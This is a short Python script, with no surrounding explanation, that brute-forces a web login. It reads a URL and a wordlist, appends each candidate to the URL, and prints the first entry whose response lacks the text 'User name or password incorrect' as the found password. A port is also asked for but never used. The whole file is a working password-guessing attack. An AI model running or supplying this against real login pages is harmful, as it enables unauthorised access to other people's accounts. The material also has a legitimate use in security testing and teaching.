import urllib
import urllib.request
import time

url =  input('Insert the url: ')
port =  input('Insert the port: ')
wlist =  input('Wordlist\'s filename: ')

file = open(wlist, 'r')

for line in file:
    line = line.strip()
    response = urllib.request.urlopen(url + line)
    message = str(response.read())
    print(message)
    if 'User name or password incorrect' in message:
        time.sleep(0.01)
        continue
    else:
        print('Password is ', line)
        break


